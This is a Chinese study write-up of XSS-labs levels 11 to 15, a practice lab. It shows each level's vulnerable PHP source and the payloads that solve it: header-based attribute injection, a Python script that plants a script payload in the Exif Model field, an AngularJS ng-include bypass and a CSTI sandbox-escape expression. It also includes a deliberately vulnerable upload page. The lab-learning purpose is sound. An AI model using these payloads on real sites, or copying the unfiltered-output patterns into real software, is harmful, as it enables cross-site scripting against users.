---
title: "Xss-labs通关全解&&XSS笔记03"
publishDate: 2025-12-26 18:37:00
description: "分析以及笔记"
tags: ["XSS", "笔记", "Web"]
language: "中文"

---

> 初学者学习并且参考整理的笔记，仅供参考，非专业人员，难免有疏忽，借鉴他人，AI辅助之处，见谅。
> 
> 我选择直接使用源码呈现（正常情况下是无法看到完整源码的，只能看到页面源码）,一方面是省去试错payload所占用的篇幅，另一方面也是为了日后温习时能更加直观，不需要再挂其他的了，我觉得大部分过滤的方法都可以被试出来，多输入几次总归可以。\

## 第十一关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.这一关从源码分析来看全是烟雾弹（真实做题看不到源码能做出来真的很厉害了，反正我看到想不到）

```php
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
```

题目中给出的四个变量，往里传什么都没用........

2.题目的切入点就在于http请求头部分

```php
$str11=$_SERVER['HTTP_REFERER'];
```

后续内容可以看到只是进行了简单的对 `<` 和`>` 的过滤，那么我们就需要一些辅助工具了，例如**Hackbar** **BurpSuite**等

3.例如使用BurpSuite抓包后直接末尾加入

```
Referer: " onclick = alert(1) type="text
```

## 第十二关

源码展示

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

1.和上一关很相似，只是把`referer`变成了`user agent`

2.依旧是BurpSuite抓包，找到`User-Agent`构造

```
User-Agent:" onclick = alert(1) type="text
```

## 第十三关

源码展示

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.和上两关没什么区别，这次变成了 `cookie`

2.源码中如下写到，使用了cookie中user的值，在看不到源码情况下，通过bp抓包也是能明显发现端倪的

```php
setcookie("user", "call me maybe?", time()+3600);
```

```
Cookie: user=call+me+maybe%3F  
```

题目中暗示我们修改user的值进而实现注入

3.剩下的就和上述关卡没什么区别了

```
Cookie: user=" onclick = alert(1) type="text
```

### HTTP请求头注入

| **关卡**       | **注入点 (HTTP Header)** | **PHP 接收代码 (漏洞源)**            | **过滤情况**                    | **核心 Payload (通用)**             |
| ------------ | --------------------- | ----------------------------- | --------------------------- | ------------------------------- |
| **Level 11** | **Referer**           | `$_SERVER['HTTP_REFERER']`    | 过滤 `<` `>` <br> **不过滤 `"`** | `" onclick=alert(1) type="text` |
| **Level 12** | **User-Agent**        | `$_SERVER['HTTP_USER_AGENT']` | 过滤 `<` `>` <br> **不过滤 `"`** | `" onclick=alert(1) type="text` |
| **Level 13** | **Cookie**            | `$_COOKIE['user']`            | 过滤 `<` `>` <br> **不过滤 `"`** | `" onclick=alert(1) type="text` |

## 第十四关

源码呈现

```html
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>

```

1.XSS Labs 的第 14 关经常被认为是“坏掉的”或者“无法完成的”

2.这里我们可以通过本地修改，实现本地运行,我这里是docker环境，就直接进去修改了`level14.php`

```php
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center>
    <h3>题目说明：此关卡考查 Exif XSS。</h3>
    <p>原题依赖的外部网站已挂，此处模拟了后端读取 Exif 的逻辑。</p>

    <form action="" method="post" enctype="multipart/form-data">
        <label>选择包含恶意 Exif 信息的图片：</label>
        <input type="file" name="file" />
        <input type="submit" value="上传并分析" />
    </form>
</center>

<?php
// 关闭错误显示，避免干扰
ini_set("display_errors", 0);

// 如果有文件上传
if(isset($_FILES["file"])) {
    // 简单的类型检查
    if ((($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/pjpeg"))) {

        $filename = $_FILES["file"]["tmp_name"];

        // 【核心考点还原】
        // 使用 exif_read_data 读取元数据
        // 原题的漏洞在于：读取了 Exif 中的 Model (相机型号) 等字段后，未过滤直接 echo
        $exif = @exif_read_data($filename);

        echo "<center><br><h3>图片分析结果：</h3>";

        if($exif && isset($exif['Model'])) {
            // 漏洞点在这里：直接拼接输出，造成 XSS
            echo "相机型号: " . $exif['Model']; 
        } else {
            echo "未读取到相机型号信息 (Model)，请确保图片带有 Exif 数据。";
        }
        echo "</center>";
    }
}
?>

<center>
    <br><br>
    <div>(成功弹窗后，点击下方链接进入下一关)</div>
    <a href="level15.php">点我进level15</a>
</center>
</body>
</html>
```
图方便，这里也没有再写其他的过滤什么的了，自己想的话也可以，最终方法也和之前的关卡大差不差

3.然后我们不妨构造`python` 脚本来实现

```python
import piexif
from PIL import Image

# 1. 设置 Payload
# 我们要在网页里执行 alert(1)，所以写入 <script>alert(1)</script>
# 注意：写入的位置是 Exif 中的 "Model" (相机型号) 字段
payload = '<script>alert("Level 14 Cracked")</script>'

# 2. 读取原始图片
img_filename = "a.jpg"  # 随便找张jpg图放在同级目录
output_filename = "hack.jpg"

try:
    img = Image.open(img_filename)

    # 3. 构造 Exif 数据
    # Tag 272 对应 Model 属性
    exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
    exif_dict["0th"][piexif.ImageIFD.Model] = payload.encode('utf-8')

    # 4. 生成字节流并保存
    exif_bytes = piexif.dump(exif_dict)
    img.save(output_filename, exif=exif_bytes)
    print(f"[+] 生成成功: {output_filename}")
    print("[+] Payload 已写入相机型号字段")

except Exception as e:
    print(f"[-] 出错了: {e}")
```

### Exif 注入

1. 核心概念
* **Exif 是什么**：图片的“隐藏备注信息”（元数据），包含相机型号、拍摄时间、GPS等。存放在 JPG 文件头部。

* **注入原理**：Exif 本质是文本。攻击者使用工具将“相机型号”等字段修改为 **恶意代码**（如 XSS Payload）。

* **触发条件**：服务器端读取了图片 Exif 信息（如 `exif_read_data()`），并且**没有过滤**就直接显示在页面上或存入数据库。
2. 攻击流程

3. **制作**：用 ExifTool 或 Python 脚本，将 Payload 写入图片字段。

4. **上传**：将“带毒”图片上传至目标网站。

5. **执行**：
   
   * **Stored XSS**：当用户/管理员查看图片详情页时触发。
   
   * **SQL 注入**：当后端将 Exif 信息存入数据库时触发（较少见）。

| **注入字段 (Tag Name)**  | **含义** | **推荐指数** | **原因**               |
| -------------------- | ------ | -------- | -------------------- |
| **Model**            | 相机型号   | ⭐⭐⭐⭐⭐    | 最常被读取和显示，Level 14 考点 |
| **Make**             | 相机制造商  | ⭐⭐⭐⭐⭐    | 常与 Model 一起被显示       |
| **ImageDescription** | 图像描述   | ⭐⭐⭐⭐     | 允许字符较长，适合长 Payload   |
| **UserComment**      | 用户注释   | ⭐⭐⭐⭐     | 专门留给用户写的，容量大         |
| **Artist**           | 摄影师/作者 | ⭐⭐⭐      | 有些相册程序会显示作者名         |
| **Copyright**        | 版权信息   | ⭐⭐⭐      | 通常显示在页面底部            |

## 第十五关

源码呈现

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>

```

1.这关的核心技术是 **AngularJS** 的前端包含漏洞。

当然直接看网页源码也能看得出来

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<body><span class="ng-include:"></span></body>
```

2.**`ng-include` 是什么？** 这是 AngularJS 的一个指令（Directive）。它的作用类似于 PHP 的 `include`，用来**把外部的一个 HTML 文件抓取过来，并放到当前标签里显示**。**原本的设计意图**：这关原本是接着 Level 14 的。作者想让你在 Level 14 上传一个含有 Payload 的图片（比如 `1.jpg`），然后在 Level 15 里引用它 (`?src='1.jpg'`)。AngularJS 会把图片当成 HTML 代码执行。但是很遗憾14关坏掉了。

3.但是我们可以换个思路 从第一关入手，我们可以如下构造

```html
level15.php?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

为什么不用 `<script>`？因为 AngularJS 通过 `ng-include` 加载进来的 HTML，如果不做特殊处理，直接的 `<script>` 标签往往不会执行，但 `<img>` 标签的 `onerror` 事件是肯定会触发的

之所以这里经过了`htmlspecialchars()`还能够正常使用，通过`ng-include ` 因为浏览器会自动处理实体编码 `&lt;` 还原为字符给 JS 使用，或者作为 URL 参数发送

### AngularJS

| **知识点**        | **关键指令/符号**                  | **作用 (正常功能)**                  | **CTF/安全考点 (黑客视角)**                                  | **典型 Payload / 场景**                               |
| -------------- | ---------------------------- | ------------------------------ | ---------------------------------------------------- | ------------------------------------------------- |
| **启动指令**       | `ng-app`                     | 定义 Angular 应用的根元素，告诉框架从这里开始解析。 | 如果页面没开 Angular，你可以注入这个属性强制开启，从而进行后续攻击。               | `<html ng-app>`                                   |
| **文件包含**       | `ng-include`                 | 加载外部 HTML 片段并编译执行。             | **绕过本地过滤**。将 XSS Payload 藏在另一个文件或 URL 中，利用此指令“借刀杀人”。 | `<div ng-include="'level1.php?x=payload'"></div>` |
| **模板表达式**      | `{{ }}`                      | 在 HTML 中输出变量或简单的计算结果。          | **CSTI (模板注入)**。利用特殊的构造绕过沙箱，执行任意 JS 代码。              | `{{constructor.constructor('alert(1)')()}}`       |
| **事件指令**       | `ng-click`<br>`ng-mouseover` | 绑定鼠标点击、悬停等事件。                  | 类似于原生的 `onclick`，但属于 Angular 体系，有时能绕过对标准 HTML 事件的过滤。 | `<div ng-mouseover="x=1">`                        |
| **不安全 HTML**   | `ng-bind-html`               | 将 HTML 内容绑定到元素上。               | 如果没有配合 `$sce` (严格上下文转义) 使用，会导致 DOM 型 XSS。            | `<div ng-bind-html="user_input">`                 |
| **过滤器**        | `\|`                         | `\|` (管道符)                     | 格式化数据（如大小写转换、排序）。                                    | 有时用来混淆 Payload，或者在老版本中利用 `orderBy` 等过滤器进行沙箱逃逸。    |
| **No-Execute** | `ng-non-bindable`            | 告诉 Angular **不要**解析该元素的内容。     | **防御手段**。如果你看到这个，说明你的注入在这块区域会失效。                     | `<span ng-non-bindable>{{1+1}}</span>`            |
